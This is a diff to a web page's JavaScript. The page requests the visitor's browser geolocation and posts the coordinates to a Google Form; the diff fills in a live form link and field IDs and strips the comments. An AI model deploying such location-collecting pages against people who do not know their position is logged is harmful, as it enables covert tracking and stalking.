@@ -8,7 +8,6 @@
   <p id="status"></p>
   <p id="location"></p>
   <script>
-    // Function to capture location data
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(showPosition, showError);
@@ -17,7 +16,6 @@
       }
     }
 
-    // Function to handle the position data
     function showPosition(position) {
       var lat = position.coords.latitude;
       var lon = position.coords.longitude;
@@ -27,7 +25,6 @@
       sendLocationToForm(lat, lon);
     }
 
-    // Function to handle errors
     function showError(error) {
       switch(error.code) {
         case error.PERMISSION_DENIED:
@@ -45,12 +42,11 @@
       }
     }
 
-    // Function to send location data to Google Form
     function sendLocationToForm(lat, lon) {
-      var formUrl = "YOUR_GOOGLE_FORM_URL"; // Replace with your Google Form URL
+      var formUrl = "https://forms.gle/nbm4D8ic3oRbaGY27"; // Your Google Form URL
       var formData = {
-        "entry.XXXXXX": lat, // Replace XXXXXX with the latitude field ID from Google Forms
-        "entry.YYYYYY": lon  // Replace YYYYYY with the longitude field ID from Google Forms
+        "entry.610101942": lat, // Latitude field ID
+        "entry.1015638874": lon  // Longitude field ID
       };
 
       var xhr = new XMLHttpRequest();
